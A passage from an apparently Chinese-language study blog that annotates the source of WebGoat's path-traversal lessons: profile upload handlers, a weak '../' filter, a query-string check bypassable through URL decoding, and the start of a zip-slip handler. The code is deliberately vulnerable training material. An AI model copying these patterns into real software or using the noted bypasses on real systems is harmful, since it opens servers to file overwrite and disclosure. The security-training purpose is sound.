class="title class_">ProfileUploadBase</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ProfileUpload</span><span class="params">(<span class="meta">@Value(&quot;$&#123;webgoat.server.directory&#125;&quot;)</span>String webGoatHomeDirectory, WebSession webSession)</span>&#123;</span><br><span class="line"><span class="comment">//        获取当前路径信息</span></span><br><span class="line">        <span class="built_in">super</span>(webGoatHomeDirectory,webSession);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@PostMapping(value = &quot;/PathTraversal/profile-upload&quot;,consumes = ALL_VALUE,produces = APPLICATION_JSON_VALUE)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">uploadFileHandler</span><span class="params">(<span class="meta">@RequestParam(&quot;uploadedFile&quot;)</span>MultipartFile file,<span class="meta">@RequestParam(value = &quot;fullName&quot;,required = false)</span>String fullName)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.execute(file,fullName);</span><br><span class="line"><span class="comment">//        首先获取了一个表单文件 接着传入了一个名字</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;/PathTraversal/profile-picture&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;?&gt; getProfilePicture()&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.getProfilePicture();</span><br><span class="line"><span class="comment">//        获取图片信息</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ProfileUploadBase"><a href="#ProfileUploadBase" class="headerlink" title="ProfileUploadBase"></a>ProfileUploadBase</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.path_traversal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.session.WebSession;</span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.Getter;</span><br><span class="line"><span class="keyword">import</span> lombok.SneakyThrows;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang3.StringUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.MediaType;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.ResponseEntity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.util.FileCopyUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.util.FileSystemUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.multipart.MultipartFile;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@Getter</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProfileUploadBase</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String webGoatHomeDirectory;</span><br><span class="line">    <span class="keyword">private</span> WebSession webSession;</span><br><span class="line">    <span class="keyword">protected</span> AttackResult <span class="title function_">execute</span><span class="params">(MultipartFile file,String fullName)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (file.isEmpty())&#123;</span><br><span class="line"><span class="comment">//            如果文件是空的</span></span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;path-traversal-profile-empty-file&quot;</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (StringUtils.isEmpty(fullName))&#123;</span><br><span class="line"><span class="comment">//            如果fullName是空的</span></span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;path-traversal-profile-empty-name&quot;</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">var</span> <span class="variable">uploadDirectory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="built_in">this</span>.webGoatHomeDirectory,<span class="string">&quot;/PathTraversal/&quot;</span> + webSession.getUserName());</span><br><span class="line"><span class="comment">//        新建一个文件目录路径对象</span></span><br><span class="line">        <span class="keyword">if</span> (uploadDirectory.exists())&#123;</span><br><span class="line"><span class="comment">//            如果上传的文件目录存在 就递归删除</span></span><br><span class="line">            FileSystemUtils.deleteRecursively(uploadDirectory);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            uploadDirectory.mkdirs();</span><br><span class="line"><span class="comment">//            创建文件夹</span></span><br><span class="line">            <span class="type">var</span> <span class="variable">uploadedFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(uploadDirectory,fullName);</span><br><span class="line"><span class="comment">//            传入上传路径与文件名</span></span><br><span class="line">            uploadedFile.createNewFile();</span><br><span class="line"><span class="comment">//            创建一个新文件</span></span><br><span class="line">            FileCopyUtils.copy(file.getBytes(),uploadedFile);</span><br><span class="line"><span class="comment">//          将传入文件信息复制到 新文件中</span></span><br><span class="line">            <span class="keyword">if</span> (attemptWasMade(uploadDirectory,uploadedFile))&#123;</span><br><span class="line"><span class="comment">//             如果文件的存放路径 与文件的路径不同</span></span><br><span class="line">                <span class="keyword">return</span> solvedIt(uploadedFile);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> informationMessage(<span class="built_in">this</span>).feedback(<span class="string">&quot;path-traversal-profile-updated&quot;</span>).feedbackArgs(uploadDirectory.getAbsoluteFile()).build();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).output(e.getMessage()).build();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> AttackResult <span class="title function_">solvedIt</span><span class="params">(File uploadedFile)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">if</span> (uploadedFile.getCanonicalFile().getParentFile().getName().endsWith(<span class="string">&quot;PathTraversal&quot;</span>))&#123;</span><br><span class="line"><span class="comment">//            如果上传的文件上级文件名为PathTraversal</span></span><br><span class="line">            <span class="keyword">return</span> success(<span class="built_in">this</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> failed(<span class="built_in">this</span>).attemptWasMade().feedback(<span class="string">&quot;path-traversal-profile-attempt&quot;</span>).feedbackArgs(uploadedFile.getCanonicalPath()).build();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">attemptWasMade</span><span class="params">(File expectedUploadDirectory, File uploadedFile)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">return</span> !expectedUploadDirectory.getCanonicalPath().equals(uploadedFile.getParentFile().getCanonicalPath());</span><br><span class="line"><span class="comment">//       是否存在这个文件</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;?&gt; getProfilePicture()&#123;</span><br><span class="line">        <span class="keyword">return</span> ResponseEntity.ok()</span><br><span class="line">                .contentType(MediaType.parseMediaType(MediaType.IMAGE_JPEG_VALUE))</span><br><span class="line">                .body(getProfilePictureAsBase64());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">protected</span> <span class="type">byte</span>[] getProfilePictureAsBase64()&#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">profilePictureDirectory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="built_in">this</span>.webGoatHomeDirectory,<span class="string">&quot;/PathTraversal/&quot;</span> + webSession.getUserName());</span><br><span class="line"><span class="comment">//        读取文件</span></span><br><span class="line">        <span class="type">var</span> <span class="variable">profileDirectoryFiles</span> <span class="operator">=</span> profilePictureDirectory.listFiles();</span><br><span class="line"><span class="comment">//        将目录下的所有文件列出来</span></span><br><span class="line">        <span class="keyword">if</span> (profileDirectoryFiles != <span class="literal">null</span> &amp;&amp; profileDirectoryFiles.length &gt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="comment">//            如果文件不是空</span></span><br><span class="line">            <span class="keyword">try</span>(<span class="type">var</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(profileDirectoryFiles[<span class="number">0</span>])) &#123;</span><br><span class="line"><span class="comment">//                就获取第一个文件</span></span><br><span class="line">                <span class="keyword">return</span> Base64.getEncoder().encode(FileCopyUtils.copyToByteArray(inputStream));</span><br><span class="line"><span class="comment">//                进行base64编码输出</span></span><br><span class="line">            &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">                <span class="keyword">return</span> defaultImage();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> defaultImage();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@SneakyThrows</span></span><br><span class="line"><span class="comment">//    自动抛异常</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">byte</span>[] defaultImage() &#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">inputStream</span> <span class="operator">=</span> getClass().getResourceAsStream(<span class="string">&quot;/images/account.png&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> Base64.getEncoder().encode(FileCopyUtils.copyToByteArray(inputStream));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220909205611401.png" alt="image-20220909205611401"></p>
<p>这里是目录穿越上传的路径</p>
<h3 id="ProfileUploadFix"><a href="#ProfileUploadFix" class="headerlink" title="ProfileUploadFix"></a>ProfileUploadFix</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.path_traversal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.session.WebSession;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Value;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.ResponseEntity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.multipart.MultipartFile;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.springframework.http.MediaType.ALL_VALUE;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.springframework.http.MediaType.APPLICATION_JSON_VALUE;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AssignmentHints(&#123;&quot;path-traversal-profile-fix.hint1&quot;, &quot;path-traversal-profile-fix.hint2&quot;, &quot;path-traversal-profile-fix.hint3&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProfileUploadFix</span> <span class="keyword">extends</span> <span class="title class_">ProfileUploadBase</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ProfileUploadFix</span><span class="params">(<span class="meta">@Value(&quot;$&#123;webgoat.server.directory&#125;&quot;)</span> String webGoatHomeDirectory, WebSession webSession)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(webGoatHomeDirectory, webSession);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@PostMapping(value = &quot;/PathTraversal/profile-upload-fix&quot;,consumes = ALL_VALUE,produces = APPLICATION_JSON_VALUE)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">uploadFileHandler</span><span class="params">(<span class="meta">@RequestParam(&quot;uploadedFileFix&quot;)</span>MultipartFile file,<span class="meta">@RequestParam(value = &quot;fullNameFix&quot;,required = false)</span>String fullName)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.execute(file,fullName != <span class="literal">null</span> ? fullName.replace(<span class="string">&quot;../&quot;</span>,<span class="string">&quot;&quot;</span>) : <span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="comment">//        先进行了过滤</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;/PathTraversal/profile-picture-fix&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;?&gt; getProfilePicture()&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.getProfilePicture();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>简单过滤</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220909213319423.png" alt="image-20220909213319423"></p>
<h3 id="ProfileUploadRemoveUserInput"><a href="#ProfileUploadRemoveUserInput" class="headerlink" title="ProfileUploadRemoveUserInput"></a>ProfileUploadRemoveUserInput</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.path_traversal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.session.WebSession;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Value;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.multipart.MultipartFile;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.springframework.http.MediaType.ALL_VALUE;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.springframework.http.MediaType.APPLICATION_JSON_VALUE;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AssignmentHints(&#123;&quot;path-traversal-profile-remove-user-input.hint1&quot;, &quot;path-traversal-profile-remove-user-input.hint2&quot;, &quot;path-traversal-profile-remove-user-input.hint3&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProfileUploadRemoveUserInput</span> <span class="keyword">extends</span> <span class="title class_">ProfileUploadBase</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ProfileUploadRemoveUserInput</span><span class="params">(<span class="meta">@Value(&quot;$&#123;webgoat.server.directory&#125;&quot;)</span>String webGoatHomeDirectory, WebSession webSession)</span>&#123;</span><br><span class="line">        <span class="built_in">super</span>(webGoatHomeDirectory,webSession);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@PostMapping(value = &quot;/PathTraversal/profile-upload-remove-user-input&quot;,consumes = ALL_VALUE,produces = APPLICATION_JSON_VALUE)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">uploadFileHandler</span><span class="params">(<span class="meta">@RequestParam(&quot;uploadedFileRemoveUserInput&quot;)</span>MultipartFile file)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.execute(file,file.getOriginalFilename());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220909214332814.png" alt="image-20220909214332814"></p>
<h3 id="ProfileUploadRetrieval"><a href="#ProfileUploadRetrieval" class="headerlink" title="ProfileUploadRetrieval"></a>ProfileUploadRetrieval</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.path_traversal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang3.RandomUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Value;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.io.ClassPathResource;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpStatus;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.MediaType;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.ResponseEntity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.jdbc.core.metadata.CallParameterMetaData;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.core.token.Sha512DigestUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.util.FileCopyUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.util.StringUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.annotation.PostConstruct;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.net.URISyntaxException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AssignmentHints(&#123;</span></span><br><span class="line"><span class="meta">        &quot;path-traversal-profile-retrieve.hint1&quot;,</span></span><br><span class="line"><span class="meta">        &quot;path-traversal-profile-retrieve.hint2&quot;,</span></span><br><span class="line"><span class="meta">        &quot;path-traversal-profile-retrieve.hint3&quot;,</span></span><br><span class="line"><span class="meta">        &quot;path-traversal-profile-retrieve.hint4&quot;,</span></span><br><span class="line"><span class="meta">        &quot;path-traversal-profile-retrieve.hint5&quot;,</span></span><br><span class="line"><span class="meta">        &quot;path-traversal-profile-retrieve.hint6&quot;&#125;)</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProfileUploadRetrieval</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> File catPicturesDirectory;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ProfileUploadRetrieval</span><span class="params">(<span class="meta">@Value(&quot;$&#123;webgoat.server.directory&#125;&quot;)</span>String webGoatHomeDirectory)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.catPicturesDirectory = <span class="keyword">new</span> <span class="title class_">File</span>(webGoatHomeDirectory,<span class="string">&quot;/PathTraversal/&quot;</span>+<span class="string">&quot;/cats&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.catPicturesDirectory.mkdirs();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@PostConstruct</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initAssignment</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="comment">//        这里是在启动项目时执行的 目的主要是获取图片信息 与初始化flag文件</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>;i &lt;= <span class="number">10</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">try</span> (<span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathResource</span>(<span class="string">&quot;lessons/path_traversal/images/cats/&quot;</span> + i + <span class="string">&quot;.jpg&quot;</span>).getInputStream())&#123;</span><br><span class="line"><span class="comment">//                首先获取所有图片的输入流</span></span><br><span class="line">                FileCopyUtils.copy(is,<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(catPicturesDirectory,i+<span class="string">&quot;.jpg&quot;</span>)));</span><br><span class="line"><span class="comment">//                复制文件进去</span></span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                log.error(<span class="string">&quot;Unable to copy pictures&quot;</span>+ e.getMessage());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">var</span> <span class="variable">secretDirectory</span> <span class="operator">=</span> <span class="built_in">this</span>.catPicturesDirectory.getParentFile().getParentFile();</span><br><span class="line"><span class="comment">//        将目录向上移动两级</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Files.writeString(secretDirectory.toPath().resolve(<span class="string">&quot;path-traversal-secret.jpg&quot;</span>),<span class="string">&quot;You found it submit the SHA-512 hash of your username as answer&quot;</span>);</span><br><span class="line"><span class="comment">//            将字符写入文件</span></span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            log.error(<span class="string">&quot;Unable to write secret in: &#123;&#125;&quot;</span>,secretDirectory,e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@PostMapping(&quot;/PathTraversal/random&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">execute</span><span class="params">(<span class="meta">@RequestParam(value = &quot;secret&quot;,required = false)</span>String secret)</span>&#123;</span><br><span class="line"><span class="comment">//        对比secret是否相同</span></span><br><span class="line">        <span class="keyword">if</span> (Sha512DigestUtils.shaHex(getWebSession().getUserName()).equals(secret))&#123;</span><br><span class="line">            <span class="keyword">return</span> success(<span class="built_in">this</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> failed(<span class="built_in">this</span>).build();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;/PathTraversal/random-picture&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;?&gt; getProfilePicture(HttpServletRequest request)&#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">queryParams</span> <span class="operator">=</span> request.getQueryString();</span><br><span class="line"><span class="comment">//        这句话是重点 其中 getQueryString 是获取url中的查询字符串 并且不会进行url 解码 不会</span></span><br><span class="line">        <span class="keyword">if</span> (queryParams != <span class="literal">null</span> &amp;&amp; (queryParams.contains(<span class="string">&quot;..&quot;</span>) || queryParams.contains(<span class="string">&quot;/&quot;</span>)))&#123;</span><br><span class="line"><span class="comment">//            这里进行了严格匹配</span></span><br><span class="line">            <span class="keyword">return</span> ResponseEntity.badRequest().body(<span class="string">&quot;Illegal characters are not allowed in the query params&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">var</span> <span class="variable">id</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;id&quot;</span>);</span><br><span class="line"><span class="comment">//            这里呢获取了这个id参数 其中呢会进行url解码</span></span><br><span class="line">            <span class="type">var</span> <span class="variable">catPicture</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(catPicturesDirectory,(id == <span class="literal">null</span> ? RandomUtils.nextInt(<span class="number">1</span>,<span class="number">11</span>) : id) + <span class="string">&quot;.jpg&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (catPicture.getName().toLowerCase().contains(<span class="string">&quot;path-traversal-secret.jpg&quot;</span>))&#123;</span><br><span class="line"><span class="comment">//                如果包含 path-traversal-secret.jpg 就将内容返回回去</span></span><br><span class="line">                <span class="keyword">return</span> ResponseEntity.ok()</span><br><span class="line">                        .contentType(MediaType.parseMediaType(MediaType.IMAGE_JPEG_VALUE))</span><br><span class="line">                        .body(FileCopyUtils.copyToByteArray(catPicture));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (catPicture.exists())&#123;</span><br><span class="line">                <span class="keyword">return</span> ResponseEntity.ok()</span><br><span class="line">                        .contentType(MediaType.parseMediaType(MediaType.IMAGE_JPEG_VALUE))</span><br><span class="line">                        .location(<span class="keyword">new</span> <span class="title class_">URI</span>(<span class="string">&quot;/PathTraversal/random-picture?id=&quot;</span>+catPicture.getName()))</span><br><span class="line">                        .body(Base64.getEncoder().encode(FileCopyUtils.copyToByteArray(catPicture)));</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> ResponseEntity.status(HttpStatus.NOT_FOUND)</span><br><span class="line">                    .location(<span class="keyword">new</span> <span class="title class_">URI</span>(<span class="string">&quot;/PathTraversal/random-picture?id=&quot;</span>+catPicture.getName()))</span><br><span class="line">                    .body(StringUtils.arrayToCommaDelimitedString(catPicture.getParentFile().listFiles()).getBytes());</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (IOException | URISyntaxException e)&#123;</span><br><span class="line">            log.error(<span class="string">&quot;Image not found&quot;</span>,e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ResponseEntity.badRequest().build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里有个参数id 也不知道咋来的</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220909224137992.png" alt="image-20220909224137992"></p>
<p>我们来看看重点代码</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220909224426508.png" alt="image-20220909224426508"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220909224416278.png" alt="image-20220909224416278"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220909224523111.png" alt="image-20220909224523111"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220909224528186.png" alt="image-20220909224528186"></p>
<h3 id="ProfileZipSlip"><a href="#ProfileZipSlip" class="headerlink" title="ProfileZipSlip"></a>ProfileZipSlip</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.path_traversal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.session.WebSession;</span><br><span class="line"><span class="keyword">import</span> lombok.SneakyThrows;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Value;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.ResponseEntity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.util.FileCopyUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.multipart.MultipartFile;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.StandardCopyOption;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.Enumeration;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.ZipEntry;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.ZipFile;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.springframework.http.MediaType.ALL_VALUE;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.springframework.http.MediaType.APPLICATION_JSON_VALUE;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AssignmentHints(&#123;&quot;path-traversal-zip-slip.hint1&quot;, &quot;path-traversal-zip-slip.hint2&quot;, &quot;path-traversal-zip-slip.hint3&quot;, &quot;path-traversal-zip-slip.hint4&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProfileZipSlip</span> <span class="keyword">extends</span> <span class="title class_">ProfileUploadBase</span> &#123;</span><br><span 